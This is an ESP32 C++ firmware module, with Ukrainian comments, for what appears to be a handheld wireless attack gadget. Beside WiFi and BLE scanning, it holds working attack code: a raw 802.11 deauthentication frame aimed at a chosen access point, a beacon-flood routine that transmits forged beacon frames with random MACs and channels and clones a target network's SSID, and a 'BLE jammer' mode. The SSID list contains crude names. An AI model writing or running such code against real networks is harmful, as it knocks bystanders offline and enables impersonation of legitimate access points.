#include "mod_cyber.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

namespace ModuleCyber
{
    const int MAX_WIFI = 5;
    const int MAX_BLE = 5;

    WiFiNetwork wifiList[MAX_WIFI];
    int foundWiFiCount = 0;

    BLEDeviceData bleList[MAX_BLE];
    int foundBLECount = 0;

    // Глобальні прапорці активності атак
    bool isDeauthActive = false;
    bool isBLEJamActive = false;
    bool isBeaconSpamActive = false;

    // ВИПРАВЛЕНО: Виділено пам'ять під змінну клонування для Ядра 0
    char targetSsidClone[32] = {0}; 

    // ВИПРАВЛЕНО: Залишено ТІЛЬКИ ОДИН унікальний список із 10 назв без дублювання!
    const char* fakeSsids[] = {
        "DOGANA_NAHUY",
        "FOLOW WHITE RABBIT",
        "SHO NADA?",
        "NE TUDY...",
        "8===3",
        "404",
        "KO-KO-KO",
        "(.)(.)",
        "MATRIX_RELOAD",
        "A DE?"
    };

    uint8_t currentAttackBssid[6];
    uint8_t currentAttackChannel = 1;

    BLEScan *pBLEScan = NULL;

    // Шаблон пакета деавтентифікації
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x01, 0x00};

    // Колбек для збору BLE пристроїв
    class MyBLEAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks
    {
        void onResult(BLEAdvertisedDevice advertisedDevice) override
        {
            if (foundBLECount >= MAX_BLE)
                return;

            const char *addressStr = advertisedDevice.getAddress().toString().c_str();
            for (int i = 0; i < foundBLECount; i++)
            {
                if (strcmp(bleList[i].macStr, addressStr) == 0)
                    return;
            }

            if (advertisedDevice.haveName())
            {
                strncpy(bleList[foundBLECount].name, advertisedDevice.getName().c_str(), 29);
                bleList[foundBLECount].name[29] = '\0';
            }
            else
            {
                strcpy(bleList[foundBLECount].name, "Unknown BLE Tag");
            }

            strncpy(bleList[foundBLECount].macStr, addressStr, 17);
            bleList[foundBLECount].macStr[17] = '\0';
            bleList[foundBLECount].rssi = advertisedDevice.getRSSI();
            foundBLECount++;
        }
    };

    void init()
    {
        WiFi.mode(WIFI_MODE_STA);
        esp_wifi_set_promiscuous(false);

        BLEDevice::init("VAMPIRE_TOAD");
        pBLEScan = BLEDevice::getScan();
        pBLEScan->setAdvertisedDeviceCallbacks(new MyBLEAdvertisedDeviceCallbacks());
        pBLEScan->setActiveScan(true);
        pBLEScan->setInterval(100);
        pBLEScan->setWindow(99);
    }

    void startWiFiScan()
    {
        stopWiFiAttack();
        foundWiFiCount = 0;
        WiFi.scanNetworks(true, true);
    }

    void stopWiFiScan()
    {
        WiFi.scanDelete();
    }

    void startWiFiDeauth(uint8_t *targetBssid, uint8_t channel)
    {
        stopWiFiAttack();
        currentAttackChannel = channel;
        memcpy(currentAttackBssid, targetBssid, 6);

        memset(&deauthPacket[4], 0xFF, 6);
        memcpy(&deauthPacket[10], targetBssid, 6);
        memcpy(&deauthPacket[16], targetBssid, 6);

        deauthPacket[24] = 0x01;
        deauthPacket[25] = 0x00;

        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(currentAttackChannel, WIFI_SECOND_CHAN_NONE);
        isDeauthActive = true;
    }

    void startWiFiBeaconSpam()
    {
        stopWiFiAttack();
        esp_wifi_set_promiscuous(true);
        isBeaconSpamActive = true;
    }

    void stopWiFiAttack()
    {
        isDeauthActive = false;
        isBeaconSpamActive = false;
        esp_wifi_set_promiscuous(false);
    }

    void startBLEScan()
    {
        stopBLEAttack();
        foundBLECount = 0;
        pBLEScan->start(0, nullptr, false);
    }

    void stopBLEScan()
    {
        pBLEScan->stop();
    }

    void startBLEJammer()
    {
        stopBLEAttack();
        isBLEJamActive = true;
    }

    void stopBLEAttack()
    {
        isBLEJamActive = false;
        stopBLEScan();
    }

    // БОЙОВИЙ РАНДОМІЗАТОР НА ЯДРІ 0
    void sendSingleBeacon() 
    {
        static uint8_t macAddr[6] = {0x00, 0x1A, 0x2B, 0x3C, 0x4D, 0x5E};
        macAddr[3] = random(0x00, 0xFF);
        macAddr[4] = random(0x00, 0xFF);
        macAddr[5] = random(0x00, 0xFF);
        
        const char* ssid = nullptr;
        
        int roll = random(0, 10);
        
        if (roll < 4) {
            ssid = targetSsidClone;
            if (strlen(ssid) == 0) ssid = "VAMPIRE_FLOOD"; 
        } 
        else {
            static int lastChosenIndex = -1;
            int randIdx = random(0, 10);
            while (randIdx == lastChosenIndex) {
                randIdx = random(0, 10); 
            }
            lastChosenIndex = randIdx;
            ssid = fakeSsids[randIdx];
        }

        uint8_t ssidLen = strlen(ssid);
        uint8_t packet[128];
        int idx = 0;

        packet[idx++] = 0x80; packet[idx++] = 0x00; 
        packet[idx++] = 0x00; packet[idx++] = 0x00; 
        memset(&packet[idx], 0xFF, 6); idx += 6;
        memcpy(&packet[idx], macAddr, 6); idx += 6;
        memcpy(&packet[idx], macAddr, 6); idx += 6;
        packet[idx++] = 0x00; packet[idx++] = 0x00;
        memset(&packet[idx], 0x00, 8); idx += 8;    
        packet[idx++] = 0x64; packet[idx++] = 0x00; 
        packet[idx++] = 0x11; packet[idx++] = 0x00; 

        packet[idx++] = 0x00;       
        packet[idx++] = ssidLen;    
        memcpy(&packet[idx], ssid, ssidLen); idx += ssidLen;

        packet[idx++] = 0x01; packet[idx++] = 0x04;
        packet[idx++] = 0x82; packet[idx++] = 0x84; packet[idx++] = 0x8B; packet[idx++] = 0x96;

        uint8_t attackChan = random(1, 12);
        esp_wifi_set_channel(attackChan, WIFI_SECOND_CHAN_NONE);
        packet[idx++] = 0x03; packet[idx++] = 0x01;
        packet[idx++] = attackChan;

        esp_wifi_80211_tx(WIFI_IF_STA, packet, idx, false);
    }

    int getWiFiCount()
    {
        int scanResult = WiFi.scanComplete();
        if (scanResult > 0)
        {
            foundWiFiCount = (scanResult > MAX_WIFI) ? MAX_WIFI : scanResult;
            for (int i = 0; i < foundWiFiCount; i++)
            {
                strncpy(wifiList[i].ssid, WiFi.SSID(i).c_str(), 31);
                wifiList[i].ssid[31] = '\0';
                wifiList[i].rssi = WiFi.RSSI(i);
                wifiList[i].channel = WiFi.channel(i);
                memcpy(wifiList[i].bssid, WiFi.BSSID(i), 6);
            }
            WiFi.scanDelete();
            WiFi.scanNetworks(true, true);
        }
        return foundWiFiCount;
    }

    WiFiNetwork getWiFiNetwork(int index) { return wifiList[index]; }
    int getBLECount() { return foundBLECount; }
    BLEDeviceData getBLEDevice(int index) { return bleList[index]; }
}
